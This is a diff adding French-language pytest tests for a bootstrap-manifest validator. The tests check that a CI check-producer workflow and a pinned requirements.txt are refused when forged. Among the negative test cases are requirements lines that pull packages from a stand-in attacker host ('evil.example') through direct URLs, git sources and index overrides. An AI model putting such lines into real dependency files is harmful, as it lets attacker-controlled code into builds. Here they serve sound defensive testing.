@@ -626,3 +626,176 @@ def test_with_the_budget_broker_an_absent_or_refusing_proof_makes_the_capacity_s
     monkeypatch.setitem(sys.modules, "collegue.broker", types.ModuleType("collegue.broker"))
     with pytest.raises(IncompleteValidation, match="collegue.broker.capability_proof"):
         business.check_worker_capacity(report, step, settings=settings)
+
+
+# ── socle dérivé : requirements.txt modifié (borné) et producteur de check de confiance ───────────────────────────────────
+
+
+from pathlib import Path  # noqa: E402
+
+PRODUCER_WORKFLOW = (Path(__file__).parent / "fixtures" / "w5-business" / "producer-workflow.reference.yml").read_text(
+    encoding="utf-8"
+)
+PRODUCER = {
+    "workflow": WORKFLOW_PATH,
+    "trigger": "pull_request_target",
+    "job": "Fixture runner",
+    "publishes": w5.REQUIRED_CHECK,
+    "head_sha_expression": "github.event.pull_request.head.sha",
+    "app_id": CHECK_APP,
+}
+PINNED = "alembic==1.14.0\nfastapi==0.116.1\nhttpx==0.28.1\npypdf==6.19.0\npytest==8.4.1\nsqlalchemy==2.0.36\nuvicorn==0.35.0\n"
+
+
+def producer_world(workflow=PRODUCER_WORKFLOW, requirements=PINNED, extra_added=None):
+    """Monde COHÉRENT avec un workflow producteur de confiance et un requirements.txt du socle aligné sur l'image."""
+    world = World()
+    approved_text = {WORKFLOW_PATH: workflow, **DOCS, "requirements.txt": requirements, **(extra_added or {})}
+    world.boot_files = {**world.seed_files, **approved_text}
+    world.refresh_trees()
+    approved = {path: sha256(text) for path, text in approved_text.items()}
+    manifest = manifest_for(
+        approved_files=approved, modified_seed_files=["requirements.txt"], check_producer=dict(PRODUCER)
+    )
+    return world, manifest
+
+
+def test_a_derived_bootstrap_with_a_bounded_requirements_change_and_a_trusted_producer_is_proved(policy):
+    world, manifest = producer_world()
+
+    evidence, _step = validate(world, manifest)
+
+    assert evidence["modified_seed_files"] == ["requirements.txt"] and evidence["workflow_jobs"] == [w5.REQUIRED_CHECK]
+    assert evidence["check_producer"]["job"] == "Fixture runner" and evidence["check_app_id"] == CHECK_APP
+    assert (
+        evidence["seed_sha256_of_modified"]["requirements.txt"]
+        != evidence["approved_sha256_of_modified"]["requirements.txt"]
+    )
+    assert sorted(evidence["approved_files"]) == sorted({WORKFLOW_PATH, "requirements.txt", *DOCS})
+
+
+@pytest.mark.parametrize(
+    "needle, edit",
+    [
+        ("pull_request_target", lambda t: t.replace("pull_request_target:", "push:\n  pull_request_target:", 1)),
+        ("référence un secret", lambda t: t + "\n# usage: ${{ secrets.TOKEN }}\n"),
+        (
+            "permissions non minimales",
+            lambda t: t.replace("checks: write", "checks: write\n  contents: write", 1).replace(
+                "contents: read\n  ", "", 1
+            ),
+        ),
+        (
+            "conserve ses identifiants",
+            lambda t: t.replace("persist-credentials: false", "persist-credentials: true", 1),
+        ),
+        ("aucune étape ne publie", lambda t: t.replace('-f name="Fixture tests"', '-f name="Autre"')),
+        ("aucune étape ne publie", lambda t: t.replace('head_sha="$HEAD_SHA"', 'head_sha="deadbeef"')),
+        (
+            "HEAD_SHA doit valoir",
+            lambda t: t.replace("HEAD_SHA: ${{ github.event.pull_request.head.sha }}", "HEAD_SHA: ${{ github.sha }}"),
+        ),
+        ("aucun job nommé", lambda t: t.replace("name: Fixture runner", "name: Autre job")),
+    ],
+)
+def test_a_forged_producer_workflow_is_refused_by_what_it_really_contains(policy, needle, edit):
+    forged = edit(PRODUCER_WORKFLOW)
+    assert forged != PRODUCER_WORKFLOW, "la contrefaçon doit changer réellement le texte"
+    world, manifest = producer_world(workflow=forged)
+
+    with pytest.raises(RuntimeError, match=needle):
+        validate(world, manifest)
+
+
+@pytest.mark.parametrize(
+    "override, needle",
+    [
+        ({"trigger": "pull_request"}, "trigger doit valoir"),
+        ({"publishes": "Ruff"}, "publishes doit valoir"),
+        ({"app_id": 1}, "app_id doit valoir"),
+        ({"head_sha_expression": "github.sha"}, "head_sha_expression"),
+        ({"workflow": "docs/runbook-ops.md"}, "workflow producteur"),
+    ],
+)
+def test_a_producer_description_that_contradicts_the_contract_is_refused(policy, override, needle):
+    world, manifest = producer_world()
+    manifest["check_producer"].update(override)
+
+    with pytest.raises(RuntimeError, match=needle):
+        validate(world, manifest)
+
+
+def test_a_producer_description_with_unknown_keys_is_refused(policy):
+    world, manifest = producer_world()
+    manifest["check_producer"]["extra"] = "x"
+    with pytest.raises(RuntimeError, match="clés exactes"):
+        validate(world, manifest)
+
+
+@pytest.mark.parametrize(
+    "requirements, needle",
+    [
+        ("fastapi>=0.1\n", "non épinglée"),
+        ("fastapi==0.116.1\n-r evil.txt\n", "non épinglée"),
+        ("fastapi==0.116.1\nfoo @ https://evil.example/foo.whl\n", "non épinglée"),
+        ("fastapi==0.116.1\ngit+https://evil.example/x.git\n", "non épinglée"),
+        ("fastapi==0.116.1 --index-url https://evil.example/simple\n", "non admise"),
+    ],
+)
+def test_a_requirements_change_with_an_unpinned_or_external_source_is_refused(policy, requirements, needle):
+    world, manifest = producer_world(requirements=requirements)
+
+    with pytest.raises(RuntimeError, match=needle):
+        validate(world, manifest)
+
+
+def test_a_requirements_file_changed_without_being_declared_or_declared_without_changing_is_refused(policy):
+    world, manifest = producer_world()
+    manifest["modified_seed_files"] = []
+    with pytest.raises(RuntimeError, match="manifeste de bootstrap : 'requirements.txt' appartient à la graine"):
+        validate(world, manifest)
+
+    world, manifest = producer_world(requirements=World().seed_files["requirements.txt"])
+    with pytest.raises(RuntimeError, match=r"hors de ce que le manifeste déclare : \[\] ≠ \[.requirements.txt.\]"):
+        validate(world, manifest)
+
+
+@pytest.mark.parametrize(
+    "path",
+    ["app/main.py", ".gitignore", "README.md", "tests/test_app.py"],
+)
+def test_no_other_seed_file_may_be_declared_modified(policy, path):
+    world, manifest = producer_world()
+    manifest["modified_seed_files"] = ["requirements.txt", path]
+
+    with pytest.raises(RuntimeError, match="modified_seed_files"):
+        validate(world, manifest)
+
+
+@pytest.mark.parametrize(
+    "path",
+    [
+        "app/export.py",
+        "app/backdoor.py",
+        "tests/test_extra.py",
+        "migrations/env.py",
+        "setup.py",
+        "docs/note.txt",
+        ".github/scripts/run.sh",
+    ],
+)
+def test_business_implementation_or_unknown_files_cannot_hide_in_the_bootstrap(policy, path):
+    world, manifest = producer_world(extra_added={path: "x = 1\n"})
+
+    with pytest.raises(RuntimeError, match="ni un contrôle, ni un document"):
+        validate(world, manifest)
+
+
+def test_added_files_declared_by_the_manifest_must_match_the_computed_split(policy):
+    world, manifest = producer_world()
+    manifest["added_files"] = [WORKFLOW_PATH]
+
+    with pytest.raises(RuntimeError, match="added_files"):
+        validate(world, manifest)
+    manifest["added_files"] = sorted(set(manifest["approved_files"]) - {"requirements.txt"})
+    validate(world, manifest)  # déclaration cohérente : acceptée
